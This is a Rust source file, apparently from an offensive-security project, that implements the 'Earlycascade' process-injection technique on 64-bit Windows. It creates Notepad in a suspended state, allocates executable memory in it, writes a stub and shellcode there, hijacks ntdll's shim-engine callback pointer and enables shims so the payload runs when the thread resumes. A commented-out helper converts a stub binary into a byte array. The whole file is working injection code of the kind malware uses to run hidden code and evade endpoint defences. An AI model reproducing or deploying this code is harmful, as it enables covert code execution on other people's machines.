// Earlycascade Injection. x64 only
// @5mukx

use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        LibraryLoader::GetModuleHandleA,
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
        Threading::{
            CREATE_SUSPENDED, CreateProcessA, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA,
            TerminateProcess,
        },
    },
};

use windows_sys::core::s;

use crate::{
    core_file::{encode_system_ptr, find_pattern, find_se_dll_loaded, find_shims_enabled},
    stubs::SHELLCODE,
    stubs::STUB,
};

mod core_file;
mod stubs;

fn main() {
    unsafe {
        const TARGET_PROCESS: *const u8 = s!("Notepad.exe");

        println!(
            "[+] Creating Process with suspended state:- {}",
            "Notepad.exe"
        );

        let si = std::mem::zeroed::<STARTUPINFOA>();
        let mut pi = std::mem::zeroed::<PROCESS_INFORMATION>();

        let success = CreateProcessA(
            std::ptr::null(),
            TARGET_PROCESS as _,
            std::ptr::null(),
            std::ptr::null(),
            0,
            CREATE_SUSPENDED,
            std::ptr::null(),
            std::ptr::null(),
            &si,
            &mut pi,
        );

        if success == 0 {
            eprintln!("[-] CreateProcess Failed");
            return;
        }

        let ntdll = GetModuleHandleA(s!("ntdll.dll")) as u64;

        let (se_dll_loaded, offset_addr) = match find_se_dll_loaded(ntdll) {
            Some(x) => x,
            None => {
                TerminateProcess(pi.hProcess, 1);
                return;
            }
        };

        let shims_enabled = match find_shims_enabled(ntdll, offset_addr) {
            Some(x) => x,
            None => {
                TerminateProcess(pi.hProcess, 1);
                return;
            }
        };

        let remote_mem = VirtualAllocEx(
            pi.hProcess,
            std::ptr::null_mut(),
            STUB.len() + SHELLCODE.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_mem.is_null() {
            TerminateProcess(pi.hProcess, 1);
            println!("[-] Failed to alloc mem");
            return;
        }

        let stub_addr = remote_mem as u64;
        let shell_addr = stub_addr + STUB.len() as u64;

        let placeholder = find_pattern(STUB, &[0x11; 8]).unwrap_or(0);
        let mut patched_stub = STUB.to_vec();
        patched_stub[placeholder..placeholder + 8].copy_from_slice(&shims_enabled.to_le_bytes());

        WriteProcessMemory(
            pi.hProcess,
            remote_mem,
            patched_stub.as_ptr() as _,
            patched_stub.len(),
            std::ptr::null_mut(),
        );

        // println!("[+] Write 1 - OK");

        WriteProcessMemory(
            pi.hProcess,
            shell_addr as _,
            SHELLCODE.as_ptr() as _,
            SHELLCODE.len(),
            std::ptr::null_mut(),
        );

        // println!("[+] Write 2 - OK");

        let encoded_ptr = encode_system_ptr(stub_addr);

        WriteProcessMemory(
            pi.hProcess,
            se_dll_loaded as _,
            &encoded_ptr as *const _ as _,
            8,
            std::ptr::null_mut(),
        );

        // println!("[+] Write 3 - OK");

        let enable: u8 = 1;

        WriteProcessMemory(
            pi.hProcess,
            shims_enabled as _,
            &enable as *const _ as _,
            1,
            std::ptr::null_mut(),
        );

        // println!("[+] Write 4 - OK");

        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        println!("[+] Executed Successfully");
    }
}

// Extract stub from .bin 
// use std::fs::File;
// use std::io::{self, Read};
// use std::path::Path;

// fn main() -> io::Result<()> {
//     let fname = ".\\stub_calc\\stub.bin";
//     let name = "STUB";

//     let path = Path::new(fname);
//     if !path.exists() {
//         eprintln!("Error: '{}' not found in the current directory.", fname);
//         return Ok(());
//     }

//     let mut file = File::open(path)?;
//     let mut buffer = Vec::new();

//     file.read_to_end(&mut buffer)?;

//     println!("pub const {}: &[u8] = &[", name);

//     for (i, byte) in buffer.iter().enumerate() {
//         let hex_val = format!("0x{:02X}", byte);
        
//         if i == buffer.len() - 1 {
//             print!("{}", hex_val);
//         } else {
//             print!("{}, ", hex_val);
//         }

//         if (i + 1) % 12 == 0 {
//             println!();
//             print!("    ");
//         }
//     }

//     println!("\n];");

//     Ok(())
// }
